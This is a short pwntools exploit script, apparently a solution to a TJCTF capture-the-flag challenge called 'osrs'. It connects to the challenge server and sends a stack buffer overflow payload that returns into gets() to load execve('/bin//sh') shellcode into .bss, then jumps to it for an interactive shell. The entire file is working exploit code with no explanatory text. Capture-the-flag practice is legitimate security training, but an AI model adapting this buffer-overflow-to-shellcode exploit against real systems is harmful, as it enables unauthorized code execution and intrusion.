from pwn import *
r=remote("p1.tjctf.org",8006)
#r=process("./osrs")
b=ELF("./osrs")
bss=0x8049f70
shellcode='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
pay=""
pay+='x'*0x10c
pay+='x'*4
pay+=p32(b.symbols['gets'])
pay+=p32(bss)
pay+=p32(bss)

r.sendline(pay)
r.sendline(shellcode)

r.interactive()
